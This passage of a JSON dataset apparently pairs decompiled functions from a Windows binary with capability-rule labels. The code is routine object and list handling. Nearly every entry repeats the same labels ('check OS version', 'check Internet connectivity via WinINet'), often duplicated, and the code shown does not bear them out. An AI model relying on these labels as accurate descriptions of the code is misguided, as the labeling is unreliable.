            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00414334(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 4) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 4) + 8))(*(arg_8h + 4));\n    }\n    return uVar1;\n}\n",
        "token_count": 94
    },
    "00419cec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00419cec(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0x20) + 4))(*(arg_8h + 0x20));\n    }\n    return uVar1;\n}\n",
        "token_count": 100
    },
    "00419d0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00419d0c(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0x20) + 8))(*(arg_8h + 0x20));\n    }\n    return uVar1;\n}\n",
        "token_count": 102
    },
    "004128b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004128b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    if (in_EDX == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.00412850();\n    }\n    if (in_ECX == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.00412850();\n    }\n    if ((iVar1 != 0) && (iVar2 != 0)) {\n        fcn.00403484();\n    }\n    return;\n}\n",
        "token_count": 160
    },
    "00412920": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00412920(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403228();\n    uVar1 = fcn.00403228();\n    *(in_EAX + 4) = uVar1;\n    uVar1 = fcn.00403228();\n    *(in_EAX + 8) = uVar1;\n    uVar1 = fcn.00403228();\n    *(in_EAX + 0xc) = uVar1;\n    fcn.00413a08();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 250
    },
    "00412b60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00412b60(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0xc) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            fcn.00413b64();\n            cVar1 = fcn.00412b40();\n            if (cVar1 != '\\0') {\n                fcn.00413a54();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    iVar2 = *(*(in_EAX + 4) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            fcn.00413b64();\n            cVar1 = fcn.00412b40();\n            if (cVar1 != '\\0') {\n                fcn.00413a54();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    iVar2 = (**(**(in_EAX + 8) + 0x14))();\n    iVar2 = iVar2 + -1;\n    if (-1 < iVar2) {\n        do {\n            (**(**(in_EAX + 8) + 0x18))();\n            cVar1 = fcn.00412b40();\n            if (cVar1 != '\\0') {\n                (**(**(in_EAX + 8) + 0x48))();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return;\n}\n",
        "token_count": 364
    },
    "00412d64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00412d64(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.00413b64();\n            if (*(iVar1 + 0x10) != '\\0') {\n                iVar3 = fcn.004129dc();\n            }\n        } while ((iVar3 == 0) && (iVar2 = iVar2 + -1,  iVar2 != 0));\n    }\n    return CONCAT44(param_2, iVar3);\n}\n",
        "token_count": 174
    },
    "00412e38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00412e38(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00412d20();\n    if (iVar2 == 0) {\n        fcn.00412da8(&stack0xfffffffc);\n    }\n    fcn.00412844();\n    var_18h = *(*(in_EAX + 4) + 8);\n    if (-1 < var_18h + -1) {\n        do {\n            iVar3 = fcn.00413b64();\n            if ((iVar3 != iVar2) && (iVar3 = *(*(iVar3 + 4) + 8) + -1,  -1 < iVar3)) {\n                do {\n                    fcn.00413b64();\n                    cVar1 = fcn.00403484();\n                    if ((cVar1 != '\\0') && (iVar4 = fcn.00412d20(),  iVar4 == iVar2)) {\n                        fcn.00413a54();\n                        fcn.00413a08();\n                    }\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != -1);\n            }\n            var_18h = var_18h + -1;\n        } while (var_18h != 0);\n    }\n    return;\n}\n",
        "token_count": 351
    },
    "00412fc4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00412fc4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 4) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            iVar1 = fcn.00413b64();\n            fcn.00412b60();\n            if (*(*(iVar1 + 0xc) + 8) == 0) {\n                fcn.00403258();\n                fcn.00413a54();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "00413014": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00413014(uint arg_8h)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    char in_DL;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_ch;\n    uint var_5h;\n    \n    if (in_DL != '\\0') {\n        puStack48 = 0x413029;\n        in_EAX = fcn.0040357c();\n    }\n    puStack48 = 0x41303c;\n    fcn.00403228();\n    puStack48 = 0x413048;\n    uVar3 = fcn.00403228();\n    *(in_EAX + 4) = uVar3;\n    puStack48 = 0x413058;\n    fcn.00412f00();\n    uStack52 = 0x413113;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    iVar5 = *(*(*0x46385c + 4) + 8);\n    puStack48 = &stack0xfffffffc;\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar5 + -1) {\n        do {\n            puStack48 = puVar1;\n            fcn.00413b64();\n            cVar2 = fcn.00412a3c();\n            if (cVar2 != '\\0') {\n                fcn.00413a08();\n            }\n            iVar5 = iVar5 + -1;\n            puVar1 = puStack48;\n        } while (iVar5 != 0);\n    }\n    if ((arg_8h != '\\0') && (iVar5 = *(*(*0x46385c + 4) + 8),  -1 < iVar5 + -1)) {\n        do {\n            iVar4 = fcn.00413b64();\n            if (*(iVar4 + 0x10) != '\\0') {\n                fcn.00413a08();\n            }\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x41311a;\n    uStack52 = 0x413112;\n    fcn.00412fb8();\n    return;\n}\n",
        "token_count": 542
    },
    "00413170": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00413170(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x41318d;\n    fcn.00412f00();\n    uStack32 = 0x4131e7;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = *(*(in_EAX + 4) + 8);\n    puStack28 = &stack0xfffffffc;\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00413b64();\n            iVar1 = fcn.004129dc();\n            if (iVar1 != 0) {\n                fcn.00403a90();\n                return iVar1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4131ee;\n    uStack32 = 0x4131e6;\n    iVar2 = fcn.00412fb8();\n    return iVar2;\n}\n",
        "token_count": 296
    },
    "00413558": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00413558(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x413570;\n    iVar1 = fcn.00413ed0();\n    uStack28 = 0x4135c2;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    iVar1 = *(iVar1 + 8) + -1;\n    puStack24 = &stack0xfffffffc;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.00413b64();\n            if (in_EAX == *(iVar2 + 4)) {\n                uVar3 = *(iVar2 + 8);\n                fcn.00403a90();\n                return uVar3;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x4135c9;\n    uStack28 = 0x4135c1;\n    uVar3 = fcn.00413f34();\n    return uVar3;\n}\n",
        "token_count": 304
    },
    "00413658": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00413658(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x463860 == 0) {\n        *0x463860 = fcn.00403228();\n    }\n    iVar1 = fcn.00413bc0();\n    if (iVar1 < 0) {\n        fcn.00413a08();\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00413698": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00413698(void)\n\n{\n    if (*0x463860 != 0) {\n        fcn.00413ca8();\n    }\n    return;\n}\n",
        "token_count": 38
    },
    "004136b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.004136b0(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    \n    iVar1 = 0;\n    if ((*0x463860 != 0) && (iVar3 = *(*0x463860 + 8) + -1,  -1 < iVar3)) {\n        do {\n            pcVar2 = fcn.00413b64();\n            iVar1 = (*pcVar2)();\n            if (iVar1 != 0) {\n                return iVar1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    return iVar1;\n}\n",
        "token_count": 150
    },
    "004136f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.004136f0(void)\n\n{\n    uint32_t uVar1;\n    \n    if (*0x46384c != NULL) {\n        uVar1 = (**0x46384c)();\n        return uVar1;\n    }\n    uVar1 = fcn.004136b0();\n    return uVar1 & 0xffffff00 | uVar1 == 0;\n}\n",
        "token_count": 87
    },
    "00413820": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00413820(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    fcn.00405d78();\n    fcn.00403258();\n    iVar1 = fcn.00405d78();\n    iVar1 = *(iVar1 + 0xc);\n    uVar2 = fcn.00413c4c();\n    iVar3 = fcn.00405d78();\n    *(iVar3 + 8) = uVar2;\n    fcn.00413a54();\n    if (*(iVar1 + 8) == 0) {\n        iVar1 = fcn.00405d78();\n        *(iVar1 + 0xc) = 0;\n        fcn.00403258();\n    }\n    return;\n}\n",
        "token_count": 174
    },
    "00413924": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00413924(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar *arg_8h;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    char var_ah;\n    uchar var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    puStack20 = 0x41393a;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    (**(**0x463848 + 0x14))();\n    uStack24 = 0x4139d2;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    var_ah = *0x4139e4 == (*(var_4h + 0x1c) & *0x4139e0);\n    puStack20 = &stack0xfffffffc;\n    if (var_ah) {\n        puStack32 = 0x41396f;\n        puStack20 = &stack0xfffffffc;\n        fcn.00413798();\n    }\n    uStack36 = 0x4139b3;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.004031a0();\n    var_9h = fcn.0041387c(arg_8h);\n    if (var_ah != '\\0') {\n        fcn.004137f0();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x4139ba;\n    if (var_ah != '\\0') {\n        uStack36 = 0x4139b2;\n        fcn.00413820();\n    }\n    return;\n}\n",
        "token_count": 448
    },
    "00413f94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00413f94(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (param_2 != *(in_EAX + 4)) {\n        if (param_2 < 0) {\n            fcn.00413f70(param_1);\n        }\n        iVar1 = param_2 + 0x1f;\n        if (iVar1 < 0) {\n            iVar1 = param_2 + 0x3e;\n        }\n        iVar2 = (iVar1 >> 5) << 2;\n        iVar1 = *(in_EAX + 4) + 0x1f;\n        if (iVar1 < 0) {\n            iVar1 = *(in_EAX + 4) + 0x3e;\n        }\n        iVar1 = (iVar1 >> 5) << 2;\n        if (iVar1 != iVar2) {\n            iVar3 = 0;\n            if (iVar2 != 0) {\n                iVar3 = fcn.004026bc();\n                fcn.00402c64();\n            }\n            if (iVar1 != 0) {\n                if (iVar3 != 0) {\n                    fcn.00413f88();\n                    fcn.004028b8();\n                }\n                fcn.004026dc();\n            }\n            *(in_EAX + 8) = iVar3;\n        }\n        *(in_EAX + 4) = param_2;\n    }\n    return;\n}\n",
        "token_count": 349
    },
    "00414038": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414038(char param_1, uint32_t param_2)\n\n{\n    uint8_t *puVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 4) <= param_2) {\n        if (param_2 < 0) {\n            fcn.0040b5f4();\n            fcn.004039e4();\n            return;\n        }\n        fcn.00413f94();\n    }\n    if (param_1 != '\\0') {\n        puVar1 = *(in_EAX + 8) + (param_2 >> 3);\n        *puVar1 = *puVar1 | '\\x01' << (param_2 & 7);\n        return;\n    }\n    puVar1 = *(in_EAX + 8) + (param_2 >> 3);\n    *puVar1 = *puVar1 & ~('\\x01' << (param_2 & 7));\n    return;\n}\n",
        "token_count": 217
    },
    "00414210": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00414279)\n\nvoid fcn.00414210(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffed4;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x4142a5;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack288;\n    fcn.004031a8();\n    fcn.0040420c();\n    iVar1 = fcn.00403454();\n    if (iVar1 != 0) {\n        fcn.00403454();\n        fcn.00403454();\n    }\n    *in_FS_OFFSET = in_stack_fffffed4;\n    fcn.00403fa8(0x4142ac);\n    return;\n}\n",
        "token_count": 217
    },
    "0041439c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041439c(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (0 < *(in_EAX[2] + 8)) {\n        puStack16 = 0x4143b8;\n        (**(*in_EAX + 0x20))();\n        uStack20 = 0x4143f6;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        while (0 < *(in_EAX[2] + 8)) {\n            fcn.00413c4c();\n            fcn.00403258();\n        }\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x4143fd;\n        uStack20 = 0x4143f5;\n        (**(*in_EAX + 0x24))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 239
    },
    "004145cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004145cc(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX[2] == 0) {\n        (**(*in_EAX + 0x30))();\n    }\n    in_EAX[2] = in_EAX[2] + 1;\n    return;\n}\n",
        "token_count": 72
    },
    "00414688": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00414688(void)\n\n{\n    int32_t *in_EAX;\n    \n    in_EAX[2] = in_EAX[2] + -1;\n    if (in_EAX[2] == 0) {\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "00414f5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00414f5c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xc) != 0) {\n        (**(**(in_EAX + 0xc) + 0x10))();\n    }\n    fcn.00405660();\n    if (*(in_EAX + 0xc) != 0) {\n        (**(**(in_EAX + 0xc) + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00414fe0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414fe0(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x415094;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x415007;\n    fcn.004145cc();\n    uStack36 = 0x415077;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    (**(*in_EAX + 0x44))();\n    if (param_2 != NULL) {\n        while (*param_2 != '\\0') {\n            for (; ((cVar1 = *param_2,  cVar1 != '\\0' && (cVar1 != '\\n')) && (cVar1 != '\\r')); param_2 = param_2 + 1) {\n            }\n            fcn.00404098();\n            (**(*in_EAX + 0x38))();\n            if (*param_2 == '\\r') {\n                param_2 = param_2 + 1;\n            }\n            if (*param_2 == '\\n') {\n                param_2 = param_2 + 1;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41507e;\n    uStack36 = 0x415076;\n    fcn.00414688();\n    return;\n}\n",
        "token_count": 414
    },
    "004154f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004154f4(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t in_EDX;\n    \n    if (*(in_EAX + 7) != '\\0') {\n        fcn.00414780();\n    }\n    if ((in_EDX < 0) || (in_EAX[5] < in_EDX)) {\n        fcn.00414780();\n    }\n    (**(*in_EAX + 0x88))(arg_8h);\n    return;\n}\n",
        "token_count": 116
    },
    "00415854": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415854(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t *extraout_ECX;\n    \n    if (arg_ch == -1) {\n        if (0x7fffffff < arg_8h) {\ncode_r0x0041586c:\n            if (arg_ch == 0) {\n                if (arg_8h < 0x80000000) goto code_r0x00415896;\n            }\n            else if (arg_ch < 1) goto code_r0x00415896;\n        }\n    }\n    else if (-2 < arg_ch) goto code_r0x0041586c;\n    fcn.0040b5f4();\n    fcn.004039e4();\n    in_EAX = extraout_ECX;\ncode_r0x00415896:\n    (**(*in_EAX + 4))();\n    return;\n}\n",
        "token_count": 209
    },
    "004158f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
